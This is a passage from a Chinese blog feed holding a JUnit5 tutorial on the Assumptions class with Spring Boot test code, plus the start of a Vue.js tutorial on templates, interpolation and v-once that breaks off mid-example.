&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/ancientear/article/details/79483592&quot; target=&quot;_blank&quot;&gt;浅谈JDK、JRE、JVM区别与联系&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/mos1896/article/details/113705134&quot; target=&quot;_blank&quot;&gt;Java的.lib库、.jar包、.Class文件? JDK中的各个文件的作用是什么？&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;/blockquote&gt;
&lt;/div&gt;</description>
<pubDate>Sat, 20 Feb 2021 00:39:00 +0000</pubDate>
<dc:creator>咕咕狐</dc:creator>
<og:description>目录： 1. JDK环境解析及安装 2. 为什么使用JDK8 3.JDK的配置及目的</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/guguhu/p/14418911.html</dc:identifier>
</item>
<item>
<title>JUnit5学习之二：Assumptions类 - 程序员欣宸</title>
<link>http://www.cnblogs.com/bolingcavalry/p/14418981.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/bolingcavalry/p/14418981.html</guid>
<description>&lt;h3 id=&quot;欢迎访问我的github&quot;&gt;欢迎访问我的GitHub&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/zq2599/blog_demos&quot; target=&quot;_blank&quot;&gt;https://github.com/zq2599/blog_demos&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;内容：所有原创文章分类汇总及配套源码，涉及Java、Docker、Kubernetes、DevOPS等；&lt;/p&gt;
&lt;h3 id=&quot;关于《junit5学习》系列&quot;&gt;关于《JUnit5学习》系列&lt;/h3&gt;
&lt;p&gt;《JUnit5学习》系列旨在通过实战提升SpringBoot环境下的单元测试技能，一共八篇文章，链接如下：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;&lt;a href=&quot;https://blog.csdn.net/boling_cavalry/article/details/108810587&quot; target=&quot;_blank&quot;&gt;基本操作&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.csdn.net/boling_cavalry/article/details/108861185&quot; target=&quot;_blank&quot;&gt;Assumptions类&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.csdn.net/boling_cavalry/article/details/108899437&quot; target=&quot;_blank&quot;&gt;Assertions类&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.csdn.net/boling_cavalry/article/details/108909107&quot; target=&quot;_blank&quot;&gt;按条件执行&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.csdn.net/boling_cavalry/article/details/108914091&quot; target=&quot;_blank&quot;&gt;标签(Tag)和自定义注解&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.csdn.net/boling_cavalry/article/details/108930987&quot; target=&quot;_blank&quot;&gt;参数化测试(Parameterized Tests)基础&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.csdn.net/boling_cavalry/article/details/108942301&quot; target=&quot;_blank&quot;&gt;参数化测试(Parameterized Tests)进阶&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.csdn.net/boling_cavalry/article/details/108952500&quot; target=&quot;_blank&quot;&gt;综合进阶（终篇）&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;本篇概览&quot;&gt;本篇概览&lt;/h3&gt;
&lt;p&gt;本文是《JUnit5学习》系列的第二篇，学习一个重要的知识点：Assumptions类，只有了解了它们，才好继续后面的学习，全篇章节如下：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;Assertions和Assumptions简介&lt;/li&gt;
&lt;li&gt;写一段代码对比效果&lt;/li&gt;
&lt;li&gt;Assumptions编码&lt;/li&gt;
&lt;li&gt;查看执行结果&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;源码下载&quot;&gt;源码下载&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;如果您不想编码，可以在GitHub下载所有源码，地址和链接信息如下表所示：&lt;/li&gt;
&lt;/ol&gt;&lt;ol start=&quot;2&quot;&gt;&lt;li&gt;这个git项目中有多个文件夹，本章的应用在&lt;span&gt;junitpractice&lt;/span&gt;文件夹下，如下图红框所示：&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202102/485422-20210220082747804-1319432048.jpg&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;ol start=&quot;3&quot;&gt;&lt;li&gt;&lt;span&gt;junitpractice&lt;/span&gt;是父子结构的工程，本篇的代码在&lt;span&gt;assertassume&lt;/span&gt;子工程中，如下图：&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202102/485422-20210220082748003-1564802742.jpg&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;assertions和assumptions简介&quot;&gt;Assertions和Assumptions简介&lt;/h3&gt;
&lt;p&gt;Assumptions和Assertions容易混淆，因此这里通过对比它们来学习：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;Assertions即断言类，里面提供了很多静态方法，例如assertTrue，如果assertTrue的入参为false，就会抛出AssertionFailedError异常，Junit对抛出此异常的方法判定为失败；&lt;/li&gt;
&lt;li&gt;Assumptions即假设类，里面提供了很多静态方法，例如assumeTrue，如果assumeTrue的入参为false，就会抛出TestAbortedException异常，Junit对抛出此异常的方法判定为跳过；&lt;/li&gt;
&lt;li&gt;简单的说，Assertions的方法抛出异常意味着测试不通过，Assumptions的方法抛出异常意味着测试被跳过(为什么称为&quot;跳过&quot;？因为&lt;span&gt;mvn test&lt;/span&gt;的执行结果被标记为&lt;span&gt;Skipped&lt;/span&gt;)；&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;写一段代码对比效果&quot;&gt;写一段代码对比效果&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;用代码来验证的效果最好，如下所示，一共四个方法，assertSuccess不抛出AssertionFailedError异常，assertFail抛出AssertionFailedError异常，assumpSuccess不抛出TestAbortedException异常，assumpFail抛出TestAbortedException异常&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;package com.bolingcavalry.assertassume.service.impl;

import lombok.extern.slf4j.Slf4j;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.boot.test.context.SpringBootTest;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assumptions.assumeTrue;

@SpringBootTest
@Slf4j
public class AssertAssumpTest {

    /**
     * 最简单的成功用例
     */
    @Test
    void assertSuccess() {
        assertEquals(2, Math.addExact(1,1));
    }

    /**
     * 最简单的失败用例
     */
    @Test
    void assertFail() {
        assertEquals(3, Math.addExact(1,1));
    }

    /**
     * assumeTrue不抛出异常的用例
     */
    @Test
    void assumpSuccess() {
        // assumeTrue方法的入参如果为true，就不会抛出异常，后面的代码才会继续执行
        assumeTrue(true);
        // 如果打印出此日志，证明assumeTrue方法没有抛出异常
        log.info(&quot;assumpSuccess的assumeTrue执行完成&quot;);
        // 接下来是常规的单元测试逻辑
        assertEquals(2, Math.addExact(1,1));
    }

    /**
     * assumeTrue抛出异常的用例
     */
    @Test
    void assumpFail() {
        // assumeTrue方法的入参如果为false，就会抛出TestAbortedException异常，后面就不会执行了
        assumeTrue(false, &quot;未通过assumeTrue&quot;);
        // 如果打印出此日志，证明assumpFail方法没有抛出异常
        log.info(&quot;assumpFail的assumeTrue执行完成&quot;);
        // 接下来是常规的单元测试逻辑，但因为前面抛出了异常，就不再执行了
        assertEquals(2, Math.addExact(1,1));
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;2&quot;&gt;&lt;li&gt;点击下图红框位置执行单元测试：&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202102/485422-20210220082748422-1417297835.jpg&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;3. 执行结果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202102/485422-20210220082750483-885529454.jpg&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;4. 另外，在target目录，可以看到surefire插件生成的单元测试报告&lt;span&gt;TEST-com.bolingcavalry.assertassume.service.impl.AssertAssumpTest.xml&lt;/span&gt;，如下图所示，testcase节点中出现了&lt;span&gt;skipped&lt;/span&gt;节点：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202102/485422-20210220082751765-786953752.jpg&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;上述对比验证再次说明Assertions和Assumptions的区别：都用来对比预期值和实际值，当预期值和实际值不一致时，Assertions的测试结果是执行失败，Assumptions的测试结果是跳过(或者忽略)；&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;assumptions实战&quot;&gt;Assumptions实战&lt;/h3&gt;
&lt;p&gt;弄清楚的Assertions和Assumptions的区别，接下来趁热打铁，学习Assumptions类中几个重要的静态方法：assumeTrue、assumingThat&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;最简单的用法如下，可见只有assumeTrue不抛出异常，后面的log.info才会执行：&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;    @Test
    @DisplayName(&quot;最普通的assume用法&quot;)
    void tryAssumeTrue() {
        assumeTrue(&quot;CI&quot;.equals(envType));

        log.info(&quot;CI环境才会打印的assumeTrue&quot;);
    }
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;2&quot;&gt;&lt;li&gt;assumeTrue可以接受Supplier类型作为第二个入参，如果assumeTrue失败就会将第二个参数的内容作为失败提示：&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Test
    @DisplayName(&quot;assume失败时带自定义错误信息&quot;)
    void tryAssumeTrueWithMessage() {
        // 第二个入参是Supplier实现，返回的内容用作跳过用例时的提示信息
        assumeTrue(&quot;CI&quot;.equals(envType),
                () -&amp;gt; &quot;环境不匹配而跳过，当前环境：&quot; + envType);

        log.info(&quot;CI环境才会打印的tryAssumeTrueWithMessage&quot;);
    }
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;效果如下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202102/485422-20210220082752722-442484809.jpg&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;3. 还有个&lt;span&gt;assumingThat&lt;/span&gt;方法，可以接受Executable类型作为第二个入参，如果第一个入参为true就会执行Executable的execute方法，注意assumingThat方法的特点：&lt;span&gt;不抛出异常&lt;/span&gt;，因此其所在的方法不会被跳过，这是和assumeTrue相比最大的区别(assumeTrue一旦入参为false就会抛出异常，其所在方法就被标记为跳过)：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;    @Test
    @DisplayName(&quot;assume成功时执行指定逻辑&quot;)
    void tryAssumingThat() {
        // 第二个入参是Executable实现，
        // 当第一个参数为true时，执行第二个参数的execute方法
        assumingThat(&quot;CI&quot;.equals(envType),
                () -&amp;gt; {
                    log.info(&quot;这一行内容只有在CI环境才会打印&quot;);
                });

        log.info(&quot;无论什么环境都会打印的tryAssumingThat&quot;);
    }
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;接下来咱们执行上述代码，看看效果；&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;执行assumptions代码&quot;&gt;执行Assumptions代码&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;先做准备工作，本次实战的springboot工程名为&lt;span&gt;assertassume&lt;/span&gt;，咱们在工程的resources目录下添加两个配置文件：application.properties和application-test.properties，位置如下图：&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202102/485422-20210220082753137-645558160.jpg&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;2. application-test.properties内容如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-properties&quot;&gt;envType:CI
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;3&quot;&gt;&lt;li&gt;application.properties内容如下：&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-properties&quot;&gt;envType:PRODUCTION
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;4&quot;&gt;&lt;li&gt;完整的单元测试类如下，通过注解ActiveProfiles，指定了使用application-test.properties的配置，因此envType的值为&lt;span&gt;CI&lt;/span&gt;：&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;package com.bolingcavalry.assertassume.service.impl;

import lombok.extern.slf4j.Slf4j;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.test.context.ActiveProfiles;
import static org.junit.jupiter.api.Assumptions.assumeTrue;
import static org.junit.jupiter.api.Assumptions.assumingThat;

@SpringBootTest
@Slf4j
@ActiveProfiles(&quot;test&quot;)
public class AssumptionsTest {

    @Value(&quot;${envType}&quot;)
    private String envType;

    @Test
    @DisplayName(&quot;最普通的assume用法&quot;)
    void tryAssumeTrue() {
        assumeTrue(&quot;CI&quot;.equals(envType));

        log.info(&quot;CI环境才会打印的assumeTrue&quot;);
    }

    @Test
    @DisplayName(&quot;assume失败时带自定义错误信息&quot;)
    void tryAssumeTrueWithMessage() {
        // 第二个入参是Supplier实现，返回的内容用作跳过用例时的提示信息
        assumeTrue(&quot;CI&quot;.equals(envType),
                () -&amp;gt; &quot;环境不匹配而跳过，当前环境：&quot; + envType);

        log.info(&quot;CI环境才会打印的tryAssumeTrueWithMessage&quot;);
    }

    @Test
    @DisplayName(&quot;assume成功时执行指定逻辑&quot;)
    void tryAssumingThat() {
        // 第二个入参是Executable实现，
        // 当第一个参数为true时，执行第二个参数的execute方法
        assumingThat(&quot;CI&quot;.equals(envType),
                () -&amp;gt; {
                    log.info(&quot;这一行内容只有在CI环境才会打印&quot;);
                });

        log.info(&quot;无论什么环境都会打印的tryAssumingThat&quot;);
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;5&quot;&gt;&lt;li&gt;执行结果如下图，可见assume通过，所有信息都被打印出来了：&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202102/485422-20210220082754000-525355523.jpg&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;ol start=&quot;6&quot;&gt;&lt;li&gt;接下来把代码中的ActiveProfiles注解那一行注释掉，如下图红框：&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202102/485422-20210220082755333-1074643597.jpg&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;ol start=&quot;7&quot;&gt;&lt;li&gt;执行结果如下，可见tryAssumingThat方法被标记为成功，不过从日志可见assumingThat的第二个入参executable没有被执行：&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202102/485422-20210220082756901-616001734.jpg&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;至此，Assumptions类的常用方法体验完成，接下来的章节会继续学习其他常用类；&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;你不孤单，欣宸原创一路相伴&quot;&gt;你不孤单，欣宸原创一路相伴&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;&lt;a href=&quot;https://xinchen.blog.csdn.net/article/details/105068742&quot; target=&quot;_blank&quot;&gt;Java系列&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://xinchen.blog.csdn.net/article/details/105086498&quot; target=&quot;_blank&quot;&gt;Spring系列&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://xinchen.blog.csdn.net/article/details/105086732&quot; target=&quot;_blank&quot;&gt;Docker系列&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://xinchen.blog.csdn.net/article/details/105086794&quot; target=&quot;_blank&quot;&gt;kubernetes系列&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://xinchen.blog.csdn.net/article/details/105086850&quot; target=&quot;_blank&quot;&gt;数据库+中间件系列&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://xinchen.blog.csdn.net/article/details/105086920&quot; target=&quot;_blank&quot;&gt;DevOps系列&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;欢迎关注公众号：程序员欣宸&quot;&gt;欢迎关注公众号：程序员欣宸&lt;/h3&gt;
&lt;blockquote readability=&quot;4.258064516129&quot;&gt;
&lt;p&gt;微信搜索「程序员欣宸」，我是欣宸，期待与您一同畅游Java世界...&lt;br/&gt;&lt;a href=&quot;https://github.com/zq2599/blog_demos&quot; target=&quot;_blank&quot;&gt;https://github.com/zq2599/blog_demos&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
<pubDate>Sat, 20 Feb 2021 00:28:00 +0000</pubDate>
<dc:creator>程序员欣宸</dc:creator>
<og:description>欢迎访问我的GitHub https://github.com/zq2599/blog_demos 内容：所有原创文章分类汇总及配套源码，涉及Java、Docker、Kubernetes、DevOPS</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/bolingcavalry/p/14418981.html</dc:identifier>
</item>
<item>
<title>2. Vue语法--插值操作&amp;动态绑定属性 详解 - 盛开的太阳</title>
<link>http://www.cnblogs.com/ITPower/p/14414360.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/ITPower/p/14414360.html</guid>
<description>&lt;h3&gt;&lt;span&gt;&lt;strong&gt;目录&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;h3&gt;&lt;span&gt;&lt;strong&gt;1. 设置vue模板&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;h3&gt;&lt;span&gt;&lt;strong&gt;2. vue语法--插值操作&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;h3&gt;&lt;span&gt;&lt;strong&gt;3. 动态绑定属性--v-bind&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;hr/&gt;

&lt;p&gt;我们经常新建一个vue项目的时候, 会写如下的一段代码&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;en&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;UTF-8&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
    &amp;lt;title&amp;gt;Title&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;div id=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;app&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;{{message}}&amp;lt;/div&amp;gt;

&amp;lt;script src=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;../js/vue.js&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;script&amp;gt;
    &lt;span&gt;const&lt;/span&gt; app = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Vue({
        el: &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;#app&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
        data: {
            message:&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;hello&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
        }
    })
&lt;/span&gt;&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;其实这就是一个代码的模板. 那么我们如何才能快速的创建这样的代码,而不是每次都手写呢? 将其创建为模板. &lt;/p&gt;
&lt;h3&gt;第一步: 设置--&amp;gt;Preference--&amp;gt;Live Template&lt;/h3&gt;
&lt;h3&gt;第二步: 添加一个group, 命名为vue. 这个视情况而定, 如果已经有了,就不用再定义了&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1187916/202102/1187916-20210219072950229-956209341.png&quot; width=&quot;600&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;h3&gt; 第三步: 添加一个Live template模板,将下面的代码复制到Template text中.&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&amp;lt;div id=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;app&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;{{message}}&amp;lt;/div&amp;gt;

&amp;lt;script src=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;../js/vue.js&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;script&amp;gt;
    &lt;span&gt;const&lt;/span&gt; app = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Vue({
        el: &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;#app&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
        data: {
            message:&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;hello&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
        }
    })
&lt;/span&gt;&amp;lt;/script&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1187916/202102/1187916-20210219073514699-1475393467.png&quot; width=&quot;600&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;h3&gt; 第四步: 在页面使用快捷键快速生产vue模板. 快捷键是vue + tab键&lt;/h3&gt;
&lt;p&gt;这样就可以快速的生成vue框架代码了, 节省了时间.&lt;/p&gt;


&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&lt;strong&gt;什么是插值操作呢?&lt;/strong&gt;&lt;/span&gt;&lt;span&gt; 

简单说, 就是将data中的文本数据,插入到html中.&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;1. 插值操作--Mastacha语法&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;语法: {{数据}}
&lt;ul&gt;&lt;li&gt;{{}} 获取vue变量的值, {{}} 这种写法就是Mastacha语法. 什么是mastacha语法? 可以参考这篇文章: https://www.cnblogs.com/DF-fzh/p/5979093.html&lt;/li&gt;
&lt;li&gt;插值运算符可以显示的对数据进行计算&lt;/li&gt;
&lt;li&gt;给html标签的内容赋值, 不可以给标签中的属性赋值.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;ul&gt;&lt;li readability=&quot;1&quot;&gt;举例:
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
  &amp;lt;div id=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;app&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
        &amp;lt;!-- 可以输出String --&amp;gt;
        &amp;lt;h2 v-text=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;&amp;lt;/h2&amp;gt;
        &amp;lt;!-- 也可以输出数字  也可以计算 --&amp;gt;
        &amp;lt;h2 v-text=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;count * 2&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;&amp;lt;/h2&amp;gt;
        &amp;lt;!-- 这样的写法v-text会替换标签的内容 --&amp;gt;
        &amp;lt;h2 v-text=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;Hello&amp;lt;/h2&amp;gt;
    &amp;lt;/div&amp;gt;
    &amp;lt;script type=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;text/javascript&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
        &lt;span&gt;var&lt;/span&gt; app=&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Vue({
            el:&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;#app&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
            data:{
                name:&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Vue&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
                count:&lt;/span&gt;&lt;span&gt;10&lt;/span&gt;&lt;span&gt;,
            }
        })
    &lt;/span&gt;&amp;lt;/script&amp;gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;/li&gt;
&lt;/ul&gt;&lt;h2&gt;&lt;strong&gt;2. 常见的其他插值操作&lt;/strong&gt;&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;v-bind: 动态绑定属性&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;v-once: 保留第一次渲染结果&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;v-html : 把html代码解析，只显示内容&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;v-text: 显示文本&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;v-pre: 原样输出&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;v-cloak: 解决文本闪烁问题&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2&gt; &lt;/h2&gt;
&lt;h2&gt;3. &lt;strong&gt;v-once: 保留第一次渲染结果&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;有些情况下, 我们不希望界面随意的跟随改变, 这时候我们可以使用vue的v-once指令&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;v-once: 该指令后面不需要增加任何表达式&lt;/li&gt;
&lt;li&gt;该指令表示元素和组件只渲染一次, 不会随着数据的改变而改变 &lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;看下面这个例子:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;en&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;UTF-8&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
    &amp;lt;title&amp;gt;Title&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;

&amp;lt;div id=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;app&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
   &lt;strong&gt; &amp;lt;h2&amp;gt;{{name}}&amp;lt;/h2&amp;gt;
    &amp;lt;h2 &lt;span&gt;v-once&lt;/span&gt;&amp;gt; {{name}}&amp;lt;/h2&amp;gt;&lt;/strong&gt;
&amp;lt;/div&amp;gt;

&amp;lt;script src=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;../js/vue.js&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;script&amp;gt;
    &lt;span&gt;var&lt;/span&gt; app = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Vue({
        el: &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;#app&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
        data: {
            message: &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;hello, everyone&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
